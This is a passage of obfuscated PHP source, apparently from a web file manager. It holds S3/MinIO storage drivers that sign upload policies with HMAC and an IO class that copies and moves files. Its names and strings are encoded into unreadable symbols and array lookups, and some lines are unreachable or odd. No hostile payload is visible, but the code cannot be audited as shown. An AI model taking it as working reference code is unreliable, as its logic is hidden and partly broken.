!1; } public function link($¨Í˜©ÏÀ, $‚Ş€Êè = array()) { $èûªßñÍ =& $_SERVER[²Ö÷öõ]; if ($this->signVer == $èûªßñÍ[247]) { return $this->client->getAuthenticatedURL($this->bucket, $¨Í˜©ÏÀ, 3600 * 12, $‚Ş€Êè); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($¨Í˜©ÏÀ, $èûªßñÍ[8]), 3600 * 12, $this->region, array(), !0, $‚Ş€Êè); } public function fileOut($ÎõëŠ˜³, $¯Ï§¶¾¯ = false, $›ôÏâÉæ = false, $ÉÛ›§ù³ = '') { $‚ÜñòÃ· =& $_SERVER[²Ö÷öõ]; if ($this->isFileOutServer()) { return $this->fileOutServer($ÎõëŠ˜³, $¯Ï§¶¾¯, $›ôÏâÉæ, $ÉÛ›§ù³); } if (!$›ôÏâÉæ) { $›ôÏâÉæ = $this->pathThis($ÎõëŠ˜³); } $µ¯¨¶â¨ = get_file_mime(get_path_ext($›ôÏâÉæ)); if ($µ¯¨¶â¨ == $‚ÜñòÃ·[248]) { return parent::fileOut($ÎõëŠ˜³, $¯Ï§¶¾¯, $›ôÏâÉæ, $ÉÛ›§ù³); } $Ï—€ğû = array($‚ÜñòÃ·[249] => $µ¯¨¶â¨); if ($¯Ï§¶¾¯) { $Ï—€ğû[$‚ÜñòÃ·[250]] = $‚ÜñòÃ·[251] . rawurlencode($›ôÏâÉæ); } else { } $İªĞáşê = $this->link($ÎõëŠ˜³, $Ï—€ğû); $this->fileOutLink($İªĞáşê); } public function fileOutServer($Ê”¦ˆªÎ, $×õ¦¢…ô = false, $÷ÖËãÂ = false, $Î–÷íÄá = '') { parent::fileOut($Ê”¦ˆªÎ, $×õ¦¢…ô, $÷ÖËãÂ, $Î–÷íÄá); } public function fileOutImageServer($´¢‰ãóã, $âú‘¹ª = 250) { parent::fileOutImage($´¢‰ãóã, $âú‘¹ª); } public function hashMd5($ï²Š‹ş£, $íñÑ‰—¢ = '') { $Ğğ˜ŒĞĞ = $this->objectMeta($ï²Š‹ş£); if (!$Ğğ˜ŒĞĞ) { return !1; } $íñÑ‰—¢ = $íñÑ‰—¢ ? $íñÑ‰—¢ : _get($Ğğ˜ŒĞĞ, $_SERVER[²Ö÷öõ][252]); return $íñÑ‰—¢; } public function uploadFormData($Øº×ÓÉ, $èüĞÄ = 3600) { $å–™¾ç¨ =& $_SERVER[²Ö÷öõ]; $«£¼‹Ï« = $this->pathFather($Øº×ÓÉ); $¡Í •× = $this->client->getHttpUploadPostParams($this->bucket, $«£¼‹Ï«, $å–™¾ç¨[229], $èüĞÄ); return array_merge((array) $¡Í •×, array($å–™¾ç¨[208] => $this->getHost())); } public function multiUploadFormData($òõıİÎ€, $ä½ˆÜ±£ = 3600) { $­ÁÕ =& $_SERVER[²Ö÷öõ]; $¿†ç„ü¥ = gmdate($­ÁÕ[253]); $ÍÕ“Ş«† = array(); $©ƒèÆó = $this->client->getUploadId($this->bucket, $òõıİÎ€, $ÍÕ“Ş«†); if (!$©ƒèÆó) { return !1; } return array($­ÁÕ[254] => $©ƒèÆó, $­ÁÕ[208] => $this->getHost() . $­ÁÕ[8] . $this->pathEncode($òõıİÎ€), $­ÁÕ[255] => $¿†ç„ü¥, $­ÁÕ[97] => $òõıİÎ€); } public function multiUploadAuthData($é¡ÀÑøÉ, $ó‰ô¤É¶ = array()) { $õŠ®§ˆô =& $_SERVER[²Ö÷öõ]; $Íï·—óï = isset($ó‰ô¤É¶[$õŠ®§ˆô[255]]) ? $ó‰ô¤É¶[$õŠ®§ˆô[255]] : gmdate($õŠ®§ˆô[253]); $îÛ×ëÍ¹ = isset($ó‰ô¤É¶[$õŠ®§ˆô[169]]) ? $ó‰ô¤É¶[$õŠ®§ˆô[169]] : $õŠ®§ˆô[12]; $´ßÓ·ë± = $ó‰ô¤É¶[$õŠ®§ˆô[97]]; unset($ó‰ô¤É¶[$õŠ®§ˆô[97]]); if (isset($ó‰ô¤É¶[$õŠ®§ˆô[256]])) { $ó‰ô¤É¶[$õŠ®§ˆô[255]] = $Íï·—óï; return $this->listUploadParts($´ßÓ·ë±, $ó‰ô¤É¶); } $Ö¬½ƒ« = array($õŠ®§ˆô[257], $õŠ®§ˆô[12], $õŠ®§ˆô[123], $õŠ®§ˆô[12], "\x78\55\141\x6d\172\55\144\141\164\145\x3a{$Íï·—óï}", $õŠ®§ˆô[8] . $this->bucket . $õŠ®§ˆô[8] . $this->pathEncode($´ßÓ·ë±) . $îÛ×ëÍ¹); if (strpos($îÛ×ëÍ¹, $õŠ®§ˆô[258]) === 0) { $Ö¬½ƒ«[0] = $õŠ®§ˆô[259]; } if (isset($ó‰ô¤É¶[$õŠ®§ˆô[260]]) && $ó‰ô¤É¶[$õŠ®§ˆô[260]] == $õŠ®§ˆô[261]) { $Ö¬½ƒ«[0] = $õŠ®§ˆô[261]; } $“ÍñöÛñ = implode($õŠ®§ˆô[262], $Ö¬½ƒ«); $ĞÙÌ”„¥ = base64_encode(hash_hmac($õŠ®§ˆô[263], $“ÍñöÛñ, $this->secret, !0)); $áºğÉ¾— = $õŠ®§ˆô[264] . $this->accessKey . $õŠ®§ˆô[4] . $ĞÙÌ”„¥; if (strpos($îÛ×ëÍ¹, $õŠ®§ˆô[258]) === 0) { return array($õŠ®§ˆô[265] => $áºğÉ¾—, $õŠ®§ˆô[255] => $Íï·—óï); } return $áºğÉ¾—; } public function listUploadParts($ÁËÒ¦¨º, $Ö®¿¨’ö = array()) { $…€ÓÏ‘¦ =& $_SERVER[²Ö÷öõ]; $“šÁÈËÏ = str_replace($…€ÓÏ‘¦[266], $…€ÓÏ‘¦[12], $Ö®¿¨’ö[$…€ÓÏ‘¦[169]]); $¶ãÑ´Ò° = $this->client->listParts($this->bucket, $ÁËÒ¦¨º, $“šÁÈËÏ); if (!$¶ãÑ´Ò°) { return !1; } unset($Ö®¿¨’ö[$…€ÓÏ‘¦[256]], $Ö®¿¨’ö[$…€ÓÏ‘¦[260]]); $Ö®¿¨’ö[$…€ÓÏ‘¦[97]] = $ÁËÒ¦¨º; $Œœ˜® = $this->multiUploadAuthData($ÁËÒ¦¨º, $Ö®¿¨’ö); if (empty($Œœ˜®)) { return !1; } return array($…€ÓÏ‘¦[265] => $Œœ˜®, $…€ÓÏ‘¦[255] => $Ö®¿¨’ö[$…€ÓÏ‘¦[255]], $…€ÓÏ‘¦[267] => $¶ãÑ´Ò°); } public function getHost() { $Òº©—‚€ =& $_SERVER[²Ö÷öõ]; $üş‘µ¼³ = parent::getHost(); if (!isset($this->osType)) { $this->osType = $this->getType(); } if (!in_array($this->osType, array($Òº©—‚€[70], $Òº©—‚€[64], $Òº©—‚€[69], $Òº©—‚€[62]))) { return $üş‘µ¼³ . $Òº©—‚€[8] . $this->bucket; } $üş‘µ¼³ = explode($Òº©—‚€[210], $üş‘µ¼³); return $üş‘µ¼³[0] . $Òº©—‚€[210] . $this->bucket . $Òº©—‚€[10] . $üş‘µ¼³[1]; } public function size($Åöƒ…Æ­) { $•ÌÂÆ÷â = $this->objectMeta($Åöƒ…Æ­); return $•ÌÂÆ÷â ? $•ÌÂÆ÷â[$_SERVER[²Ö÷öõ][79]] : 0; } public function info($ÁŒ®÷…‘) { if ($this->isFolder($ÁŒ®÷…‘)) { return $this->folderInfo($ÁŒ®÷…‘); } else { if ($this->isFile($ÁŒ®÷…‘)) { return $this->fileInfo($ÁŒ®÷…‘); } } return !1; } public function exist($Ì¤×Ç«œ) { return $this->isFile($Ì¤×Ç«œ) || $this->isFolder($Ì¤×Ç«œ); } public function isFile($öı…Ïæ·) { return !$this->isFolder($öı…Ïæ·) && $this->objectMeta($öı…Ïæ·); } public function isFolder($Ì¢Âßæ·) { return $this->cacheMethod($_SERVER[²Ö÷öõ][179], $Ì¢Âßæ·); } protected function objectMeta($çË–ã¼Ä) { return $this->cacheMethod($_SERVER[²Ö÷öõ][181], $çË–ã¼Ä); } protected function _objectMeta($¶‹ÀµáÛ) { $Ì·“¸Ï =& $_SERVER[²Ö÷öõ]; $¶‹ÀµáÛ = rtrim($¶‹ÀµáÛ, $Ì·“¸Ï[8]); try { $µ‰ı¼§‹ = $this->client->getObjectInfo($this->bucket, $¶‹ÀµáÛ); if (!isset($µ‰ı¼§‹[$Ì·“¸Ï[252]]) && isset($µ‰ı¼§‹[$Ì·“¸Ï[268]])) { $µ‰ı¼§‹[$Ì·“¸Ï[252]] = $µ‰ı¼§‹[$Ì·“¸Ï[268]]; } } catch (Exception $´ø—áëâ) { $µ‰ı¼§‹ = !1; } if (!$µ‰ı¼§‹) { } return $µ‰ı¼§‹; } protected function _isFolder($œŸºöáş) { $˜Œœš =& $_SERVER[²Ö÷öõ]; $œŸºöáş = rtrim($œŸºöáş, $˜Œœš[8]); if ($œŸºöáş == $˜Œœš[12] || $œŸºöáş == $˜Œœš[8]) { return !0; } $ä¤â ©º = $this->client->getBucket($this->bucket, $œŸºöáş, null, 1); if (empty($ä¤â ©º[$˜Œœš[236]])) { return !1; } $ÇÇ­óÅ‘ = $ä¤â ©º[$˜Œœš[236]][0][$˜Œœš[32]]; return stripos($ÇÇ­óÅ‘, $œŸºöáş . $˜Œœš[8]) === 0 ? !0 : !1; if (substr($ÇÇ­óÅ‘, -1) == $˜Œœš[8]) { return !0; } if (get_path_this($ÇÇ­óÅ‘) == get_path_this($œŸºöáş)) { return !1; } return !0; } public function listObject($·í³ı‰ğ) { return $this->fileList($·í³ı‰ğ, $_SERVER[²Ö÷öõ][12], !0); } } class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($¿Çã™´) { $ÊÂ…ìÆÛ =& $_SERVER[²Ö÷öõ]; parent::__construct($¿Çã™´); $this->setSignVersion($ÊÂ…ìÆÛ[247]); if (!$this->region) { $this->region = $ÊÂ…ìÆÛ[269]; $this->client->setRegion($this->region); } $this->client->setHeadValid(!1); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function checkRegion() { $•Äòüò = $this->getBucketRgn(); return $this->region == $•Äòüò ? !0 : !1; } public function uploadFormData($¤şµÁØ, $’­Í×Áï = 3600) { $ö‚›·”¯ =& $_SERVER[²Ö÷öõ]; $âÏ†ÌĞ = $ö‚›·”¯[229]; $¿äñË = $ö‚›·”¯[270]; $¿ÊÃ§·¯ = $ö‚›·”¯[62]; $ô’ÜÙ£Ì = gmdate($ö‚›·”¯[271]); $ú¿Üô‡ó = gmdate($ö‚›·”¯[272]); $÷˜´õ¡Æ = $ö‚›·”¯[273]; $Ø’ê‰Ó = $’­Í×Áï . $ö‚›·”¯[12]; $Òè½ÎÆ = $ö‚›·”¯[274]; $á»ùûª§ = array($this->accessKey, $ú¿Üô‡ó, $this->region, $¿ÊÃ§·¯, $÷˜´õ¡Æ); $ÍÌŠÄÅ€ = implode($ö‚›·”¯[8], $á»ùûª§); $´¶€¯ºÛ = array($ö‚›·”¯[275] => gmdate($ö‚›·”¯[276], strtotime($ö‚›·”¯[277])), $ö‚›·”¯[278] => array(array($ö‚›·”¯[279] => $this->bucket), array($ö‚›·”¯[280] => $âÏ†ÌĞ), array($ö‚›·”¯[281], $ö‚›·”¯[282], $ö‚›·”¯[12]), array($ö‚›·”¯[281], $ö‚›·”¯[283], $ö‚›·”¯[12]), array($ö‚›·”¯[281], $ö‚›·”¯[284], $ö‚›·”¯[12]), array($ö‚›·”¯[285] => $Òè½ÎÆ), array($ö‚›·”¯[286] => $ÍÌŠÄÅ€), array($ö‚›·”¯[287] => $¿äñË), array($ö‚›·”¯[288] => $ô’ÜÙ£Ì), array($ö‚›·”¯[289] => $Ø’ê‰Ó))); $™£¼ ‹î = base64_encode(json_encode($´¶€¯ºÛ)); $êÔ¹Åæ = hash_hmac($ö‚›·”¯[290], $ú¿Üô‡ó, $ö‚›·”¯[291] . $this->secret, !0); $²ªå´ÍÉ = hash_hmac($ö‚›·”¯[290], $this->region, $êÔ¹Åæ, !0); $´·œ¯ = hash_hmac($ö‚›·”¯[290], $¿ÊÃ§·¯, $²ªå´ÍÉ, !0); $Õõ÷şŸ = hash_hmac($ö‚›·”¯[290], $÷˜´õ¡Æ, $´·œ¯, !0); $¯È›ÀĞÂ = hash_hmac($ö‚›·”¯[290], $™£¼ ‹î, $Õõ÷şŸ); $àùíÇùÎ = array($ö‚›·”¯[246] => $ö‚›·”¯[12], $ö‚›·”¯[292] => $ö‚›·”¯[12], $ö‚›·”¯[280] => $âÏ†ÌĞ, $ö‚›·”¯[285] => $Òè½ÎÆ, $ö‚›·”¯[293] => $™£¼ ‹î, $ö‚›·”¯[294] => $ÍÌŠÄÅ€, $ö‚›·”¯[295] => $¿äñË, $ö‚›·”¯[296] => $ô’ÜÙ£Ì, $ö‚›·”¯[297] => $Ø’ê‰Ó, $ö‚›·”¯[298] => $¯È›ÀĞÂ, $ö‚›·”¯[208] => $this->getHost()); return $àùíÇùÎ; } } goto c×Íæ¾ˆ©¦; CÑ÷äğ¬é: class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($÷òÖ…¾‡, $ùËÒ²) { $³¢“Ñ¯ =& $_SERVER[²Ö÷öõ]; $çùŠ¹¯Æ = $ùËÒ²; $GLOBALS[$³¢“Ñ¯[1235]] = $³¢“Ñ¯[1236] . $÷òÖ…¾‡; Hook::trigger($³¢“Ñ¯[1236] . $÷òÖ…¾‡ . $³¢“Ñ¯[1237], $çùŠ¹¯Æ); $Ë©øİüŒ = self::driverMake($ùËÒ²[0]); if (!$Ë©øİüŒ) { return !1; } if (method_exists($Ë©øİüŒ, $÷òÖ…¾‡)) { $Ê¿€¦Á = @call_user_func_array(array($Ë©øİüŒ, $÷òÖ…¾‡), $ùËÒ²); } else { if (method_exists($Ë©øİüŒ, $³¢“Ñ¯[1238])) { $Ê¿€¦Á = @call_user_func_array(array($Ë©øİüŒ, $÷òÖ…¾‡), $ùËÒ²); } else { if (method_exists(self, $÷òÖ…¾‡)) { $Ê¿€¦Á = @call_user_func_array(array(self, $÷òÖ…¾‡), $ùËÒ²); } else { $Ê¿€¦Á = call_user_func_array(array(parent, $÷òÖ…¾‡), $ùËÒ²); } } } Hook::trigger($³¢“Ñ¯[1236] . $÷òÖ…¾‡ . $³¢“Ñ¯[1239], $çùŠ¹¯Æ, $Ê¿€¦Á); return $Ê¿€¦Á; } public static function init($’¬¶Ğ³Å) { return self::driverMake($’¬¶Ğ³Å); } public static function copy($ôªÃ£è, $ß”„Ú¯È, $êè•ı‚¡ = false, $¨÷¼ñÆÚ = false) { return self::copyMoveStart($ôªÃ£è, $ß”„Ú¯È, $êè•ı‚¡, $_SERVER[²Ö÷öõ][618], $¨÷¼ñÆÚ); } public static function move($Ï¢àûÕ«, $ùïõíô, $êÄáÜê¥ = false, $âöºßÎÛ = false) { return self::copyMoveStart($Ï¢àûÕ«, $ùïõíô, $êÄáÜê¥, $_SERVER[²Ö÷öõ][620], $âöºßÎÛ); } private static function copyMoveStart($ ã ƒ¾Ë, $‹—Á¤ğ, $ç™ãŒ—¿, $¶¯ïªƒè, $»ş¯ÑÎ) { $˜óÄİš… =& $_SERVER[²Ö÷öõ]; $¬²¯á–× = array($ ã ƒ¾Ë, $‹—Á¤ğ, $ç™ãŒ—¿, $»ş¯ÑÎ); Hook::trigger($˜óÄİš…[1236] . $¶¯ïªƒè . $˜óÄİš…[1237], $¬²¯á–×); $åŒ¼Ä¨ = self::copyMove($ ã ƒ¾Ë, $‹—Á¤ğ, $ç™ãŒ—¿, $¶¯ïªƒè, $»ş¯ÑÎ); Hook::trigger($˜óÄİš…[1236] . $¶¯ïªƒè . $˜óÄİš…[1239], $¬²¯á–×, $åŒ¼Ä¨); return $åŒ¼Ä¨; } public static function saveFile($¹ñ…À€ã, $ÑöÁî“ó, $á—ò˜±í = true) { $ÎÃç¨‡ =& $_SERVER[²Ö÷öõ]; $ÊµÁøª = self::info($ÑöÁî“ó); $ìùÓ‚’ = self::driverMake($¹ñ…À€ã); $¶‹¦­‰Ó = self::driverMake($ÑöÁî“ó); $Â ¤ûØí = !1; if ($¶‹¦­‰Ó->pathParse[$ÎÃç¨‡[1240]]) { $Â ¤ûØí = $¶‹¦­‰Ó; $´™ÁµÎ = $¶‹¦­‰Ó->pathParse[$ÎÃç¨‡[1240]]; $¶‹¦­‰Ó = self::driverMake($´™ÁµÎ); } if ($ìùÓ‚’->pathParse[$ÎÃç¨‡[1240]]) { $¡³¢„Œ = $ìùÓ‚’->pathParse[$ÎÃç¨‡[1240]]; $ìùÓ‚’ = self::driverMake($¡³¢„Œ); } $¡Èİßè½ = $¶‹¦­‰Ó->pathFather($ÑöÁî“ó); $ÅĞòÜ‹¿ = !0; if (!$á—ò˜±í && self::driverIsSame($ìùÓ‚’, $¶‹¦­‰Ó)) { $ÅĞòÜ‹¿ = !1; } $Øû‹äÙì = self::copyFile($ìùÓ‚’, $¹ñ…À€ã, $¶‹¦­‰Ó, $¡Èİßè½, $ÊµÁøª[$ÎÃç¨‡[32]], $ÅĞòÜ‹¿); if ($Â ¤ûØí) { $Øû‹äÙì = $Â ¤ûØí->getPathOuter($Øû‹äÙì); } return $Øû‹äÙì; } private static function copyMove($Âùöá‘ñ, $±ûı‰Îë, $‘½É°äØ, $¶›ïÃŸª, $­ÓİÄ = false) { $¼£áŒ²ú =& $_SERVER[²Ö÷öõ]; if (!$Âùöá‘ñ || $Âùöá‘ñ == $¼£áŒ²ú[8] || !$±ûı‰Îë) { return !1; } ignore_timeout(); $¯ÛíÆœÃ = self::driverMake($Âùöá‘ñ); $äÉéİ¿® = self::driverMake($±ûı‰Îë); $¼ÕâÆëÑ = $¶›ïÃŸª == $¼£áŒ²ú[620]; $ˆŞü²í¡ = !1; if ($äÉéİ¿®->pathParse[$¼£áŒ²ú[1240]]) { $ˆŞü²í¡ = $äÉéİ¿®; $±ûı‰Îë = $äÉéİ¿®->pathParse[$¼£áŒ²ú[1240]]; $äÉéİ¿® = self::driverMake($±ûı‰Îë); } if ($¯ÛíÆœÃ->pathParse[$¼£áŒ²ú[1240]]) { $Âùöá‘ñ = $¯ÛíÆœÃ->pathParse[$¼£áŒ²ú[1240]]; $¯ÛíÆœÃ = self::driverMake($Âùöá‘ñ); } self::check($¯ÛíÆœÃ, $Âùöá‘ñ, $äÉéİ¿®, $±ûı‰Îë); Hook::trigger($¼£áŒ²ú[1241], $¯ÛíÆœÃ, $Âùöá‘ñ, $äÉéİ¿®, $±ûı‰Îë); $™ôûÍ¸¨ = self::driverIsSame($¯ÛíÆœÃ, $äÉéİ¿®); if ($™ôûÍ¸¨) { if ($¶›ïÃŸª == $¼£áŒ²ú[620] && !method_exists($äÉéİ¿®, $¼£áŒ²ú[1242]) && trim($±ûı‰Îë, $¼£áŒ²ú[8]) == trim($äÉéİ¿®->pathFather($Âùöá‘ñ), $¼£áŒ²ú[8])) { if ($¯ÛíÆœÃ->pathThis($Âùöá‘ñ) != $­ÓİÄ && !$¯ÛíÆœÃ->isOsDriver()) { return $¯ÛíÆœÃ->rename($Âùöá‘ñ, $­ÓİÄ); } return $äÉéİ¿®->getPathOuter($Âùöá‘ñ); } if (method_exists($äÉéİ¿®, $¶›ïÃŸª)) { return $äÉéİ¿®->{$¶›ïÃŸª}($Âùöá‘ñ, $±ûı‰Îë, $‘½É°äØ, $­ÓİÄ); } } if ($™ôûÍ¸¨ && $¶›ïÃŸª == $¼£áŒ²ú[620] && $äÉéİ¿®->getType() == $¼£áŒ²ú[109]) { $ª“¾ÍØà = $äÉéİ¿®->movePath($Âùöá‘ñ, $±ûı‰Îë, $­ÓİÄ); if ($ª“¾ÍØà) { return $ª“¾ÍØà; } } $ùÏà•öî = $¯ÛíÆœÃ->isFile($Âùöá‘ñ); if (!$ùÏà•öî && $äÉéİ¿®->getType() == $¼£áŒ²ú[840] && $¯ÛíÆœÃ->getType() == $¼£áŒ²ú[109]) { $ª“¾ÍØà = $äÉéİ¿®->copyFolderFromIO($¯ÛíÆœÃ, $Âùöá‘ñ, $±ûı‰Îë, $‘½É°äØ, $¼ÕâÆëÑ, $­ÓİÄ); } else { $ª“¾ÍØà = self::copyPath($¯ÛíÆœÃ, $Âùöá‘ñ, $äÉéİ¿®, $±ûı‰Îë, $‘½É°äØ, $¼ÕâÆëÑ, $ùÏà•öî, $­ÓİÄ); } if ($ª“¾ÍØà && $¼ÕâÆëÑ) { $¯ÛíÆœÃ->remove($Âùöá‘ñ); } if ($ˆŞü²í¡) { $ª“¾ÍØà = $ˆŞü²í¡->getPathOuter($ª“¾ÍØà); } return $ª“¾ÍØà; } private static function check($Çñªƒ©‹, $‰–Ú€‰, $İÏğèı¯, &$€Ô×èÍ) { $‰¬ê¹¼ =& $_SERVER[²Ö÷öõ]; if (self::driverIsSame($Çñªƒ©‹, $İÏğèı¯) && $Çñªƒ©‹->isFolder($‰–Ú€‰) && $Çñªƒ©‹->isParentOf($‰–Ú€‰, $€Ô×èÍ)) { show_json(LNG($‰¬ê¹¼[1243]), !1); } if (!$Çñªƒ©‹->exist($‰–Ú€‰)) { show_json(LNG($‰¬ê¹¼[108]), !1); } } private static function copyPath($Ø£¬ùÜ, $»İ»Êªê, $íøŸ†‚¬, $ëíì›ò•, $íöÚü½, $­¸€ª¸ê, $“ÃÙ¯ï–, $Ø¨©‡ë = false, $ÅÙòÛá = true) { $ÀüÜâåû =& $_SERVER[²Ö÷öõ]; $ÛÖÍ‡‹ = empty($Ø¨©‡ë) && $Ø¨©‡ë !== $ÀüÜâåû[228] ? $Ø£¬ùÜ->pathThis($»İ»Êªê) : $Ø¨©‡ë; if ($íöÚü½) { $—–³¯ = $íøŸ†‚¬->fileNameExist($ëíì›ò•, $ÛÖÍ‡‹); $ØÍ„Õã¤ = $ÛÖÍ‡‹; $ÛÖÍ‡‹ = $íøŸ†‚¬->fileNameAuto($ëíì›ò•, $ÛÖÍ‡‹, $íöÚü½, !$“ÃÙ¯ï–); if (!$—–³¯ || $ØÍ„Õã¤ != $ÛÖÍ‡‹) { $íöÚü½ = !1; } if ($ÅÙòÛá && !$íöÚü½) { $íøŸ†‚¬->_data[$ÀüÜâåû[1244]] = !0; } } if ($“ÃÙ¯ï–) { return self::copyFile($Ø£¬ùÜ, $»İ»Êªê, $íøŸ†‚¬, $ëíì›ò•, $ÛÖÍ‡‹, $­¸€ª¸ê); } if ($íöÚü½ == REPEAT_RENAME_FOLDER) { $íöÚü½ = !1; } $©ÔÊÑù¤ = rtrim($ëíì›ò•, $ÀüÜâåû[8]) . $ÀüÜâåû[8] . $ÛÖÍ‡‹; $—âÖ„ ” = $íøŸ†‚¬->mkdir($íøŸ†‚¬->getPath($©ÔÊÑù¤), $íöÚü½); $ëíì›ò• = $íøŸ†‚¬->getPathInner($—âÖ„ ”); $Ñ£Í°›Ï = $Ø£¬ùÜ->listPath($»İ»Êªê, !0); $Ñ£Í°›Ï = is_array($Ñ£Í°›Ï) ? $Ñ£Í°›Ï : array($ÀüÜâåû[86] => array(), $ÀüÜâåû[85] => array()); $ã—È€à£ = array_merge($Ñ£Í°›Ï[$ÀüÜâåû[86]], $Ñ£Í°›Ï[$ÀüÜâåû[85]]); foreach ($ã—È€à£ as $Úâ°Œ¦) { $ìî…¢ù÷ = $Úâ°Œ¦[$ÀüÜâåû[33]] == $ÀüÜâåû[230]; $»İ»Êªê = $Ø£¬ùÜ->getPathInner($Úâ°Œ¦[$ÀüÜâåû[87]]); $Ö–Ãˆ¢ = self::copyPath($Ø£¬ùÜ, $»İ»Êªê, $íøŸ†‚¬, $ëíì›ò•, $íöÚü½, $­¸€ª¸ê, $ìî…¢ù÷, !1, !1); if (!$Ö–Ãˆ¢) { IO::errorTips($ÀüÜâåû[1245] . $»İ»Êªê . $ÀüÜâåû[73] . $ëíì›ò•); } } self::copyMoveKeepInfo($Ø£¬ùÜ, $»İ»Êªê, $—âÖ„ ”); return $—âÖ„ ”; } private static function copyFile($åƒ¹‘öµ, $ÄïÖ‡°„, $¸¦‘Ñæ, $‹‚ğÉÂ’, $ØëÕá™å, $®ËúĞ—Ë) { $äîóäİ =& $_SERVER[²Ö÷öõ]; $‹‚ğÉÂ’ = $¸¦‘Ñæ->getPath(rtrim($‹‚ğÉÂ’, $äîóäİ[8]) . $äîóäİ[8] . $ØëÕá™å); $ƒéÔÃòë = $äîóäİ[1246] . time() . rand_string(5); Hook::trigger($äîóäİ[1247], $åƒ¹‘öµ, $ÄïÖ‡°„, $¸¦‘Ñæ, $‹‚ğÉÂ’, $ØëÕá™å, $ƒéÔÃòë); if (self::driverIsSame($åƒ¹‘öµ, $¸¦‘Ñæ)) { if ($®ËúĞ—Ë) { $’Èç¶ş = $¸¦‘Ñæ->moveFile($ÄïÖ‡°„, $‹‚ğÉÂ’); } else { $’Èç¶ş = $¸¦‘Ñæ->copyFile($ÄïÖ‡°„, $‹‚ğÉÂ’); } Hook::trigger($äîóäİ[1248], $åƒ¹‘öµ, $ÄïÖ‡°„, $¸¦‘Ñæ, $‹‚ğÉÂ’, $ØëÕá™å, $’Èç¶ş); self::copyMoveKeepInfo($åƒ¹‘öµ, $ÄïÖ‡°„, $’Èç¶ş); return $’Èç¶ş; } $ñ÷ª´¼– = TEMP_FILES; if ($GLOBALS[$äîóäİ[6]][$äîóäİ[92]][$äîóäİ[879]]) { $ñ÷ª´¼– = $GLOBALS[$äîóäİ[6]][$äîóäİ[92]][$äîóäİ[879]]; } $«åßÊ¬ = $ñ÷ª´¼–; mk_dir($«åßÊ¬); $¨“—­ìë = $«åßÊ¬ . $ƒéÔÃòë; $½ı®Ô’ò = $¨“—­ìë; $¨“—­ìë = $åƒ¹‘öµ->download($ÄïÖ‡°„, $¨“—­ìë); $¨“—­ìë = $åƒ¹‘öµ->iconvApp($¨“—­ìë); if (substr($¨“—­ìë, strlen($ñ÷ª´¼–)) == $ñ÷ª´¼–) { $®ËúĞ—Ë = !0; } $’Èç¶ş = $¸¦‘Ñæ->upload($‹‚ğÉÂ’, $¨“—­ìë, $®ËúĞ—Ë); self::remove($½ı®Ô’ò); Hook::trigger($äîóäİ[1248], $åƒ¹‘öµ, $ÄïÖ‡°„, $¸¦‘Ñæ, $‹‚ğÉÂ’, $ØëÕá™å, $’Èç¶ş); self::copyMoveKeepInfo($åƒ¹‘öµ, $ÄïÖ‡°„, $’Èç¶ş); return $’Èç¶ş; } private static function copyMoveKeepInfo($ã¤²ù°Û, $İ¯¡…ßâ, $´²İÔèè) { if (!$´²İÔèè) { return; } $‹Ë•ÎÒ = $ã¤²ù°Û->info($İ¯¡…ßâ); if (!is_array($‹Ë•ÎÒ)) { return; } IO::setModifyTime($´²İÔèè, $‹Ë•ÎÒ[$_SERVER[²Ö÷öõ][88]]); } public static function pathFather($ßÆöƒŸÁ) { $–·öË® = IO::init($ßÆöƒŸÁ); $Ã©Ûò¨ = $–·öË®->pathFather($–·öË®->path); return $–·öË®->getPathOuter($Ã©Ûò¨); } public static function fileOut($áı ƒ½ş, $ı¿…îê = false, $—ëîÙß = false, $€œŠÄË» = '') { $¨»»€ïÕ = self::driverMake($áı ƒ½ş); if ($¨»»€ïÕ->isFileOutServer()) { return $¨»»€ïÕ->fileOutServer($áı ƒ½ş, $ı¿…îê, $—ëîÙß, $€œŠÄË»); } return $¨»»€ïÕ->fileOut($áı ƒ½ş, $ı¿…îê, $—ëîÙß, $€œŠÄË»); } public static function fileOutImage($ª™Ç†©İ, $èÌÙæ³ = 250) { $¶±ß÷õü = array(250, 600, 1200, 2000, 3000, 5000); for ($Ñ¨ˆã“ë = 0; $Ñ¨ˆã“ë < count($¶±ß÷õü); $Ñ¨ˆã“ë++) { if ($Ñ¨ˆã“ë == 0 && $èÌÙæ³ <= $¶±ß÷õü[$Ñ¨ˆã“ë]) { $èÌÙæ³ = $¶±ß÷õü[$Ñ¨ˆã“ë]; break; } else { if ($èÌÙæ³ > $¶±ß÷õü[$Ñ¨ˆã“ë - 1] && $èÌÙæ³ <= $¶±ß÷õü[$Ñ¨ˆã“ë]) { $èÌÙæ³ = $¶±ß÷õü[$Ñ¨ˆã“ë]; break; } else { if ($Ñ¨ˆã“ë == count($¶±ß÷õü) - 1 && $èÌÙæ³ > $¶±ß÷õü[$Ñ¨ˆã“ë]) { $èÌÙæ³ = $¶±ß÷õü[$Ñ¨ˆã“ë]; break; } } } } $¨¸Ë³á = self::driverMake($ª™Ç†©İ); if ($¨¸Ë³á->isFileOutServer()) { return $¨¸Ë³á->fileOutImageServer($ª™Ç†©İ, $èÌÙæ³); } return $¨¸Ë³á->fileOutImage($ª™Ç†©İ, $èÌÙæ³); } private static function driverIsSame($èä•¥àÆ, $´ÌÄ´) { $‡…æÏ§’ =& $_SERVER[²Ö÷öõ]; $öµ•ŠÇÎ = $èä•¥àÆ->getType(); $‹—“ô€ = $´ÌÄ´->getType(); if ($öµ•ŠÇÎ != $‹—“ô€) { return !1; } if ($öµ•ŠÇÎ == $‡…æÏ§’[840]) { return !0; } if ($öµ•ŠÇÎ == $‡…æÏ§’[109]) { return !0; } if ($èä•¥àÆ->pathDriver == $´ÌÄ´->pathDriver) { return !0; } return !1; } public static function copyUpdate($¿ìÃğóˆ, $±¾İ ŞÇ) { $®ß…åÇâ =& $_SERVER[²Ö÷öõ]; if (!IO::exist($¿ìÃğóˆ)) { return !1; } if (!IO::exist($±¾İ ŞÇ)) { IO::mkdir($±¾İ ŞÇ); } $ÒÄŸŠã¬ = array_to_keyvalue(self::listAllSimple($¿ìÃğóˆ), $®ß…åÇâ[87]); $”«‚Êíí = array_to_keyvalue(self::listAllSimple($±¾İ ŞÇ), $®ß…åÇâ[87]); $ïõí–Ìİ = array(); $«ä¬­³ƒ = array(); foreach ($ÒÄŸŠã¬ 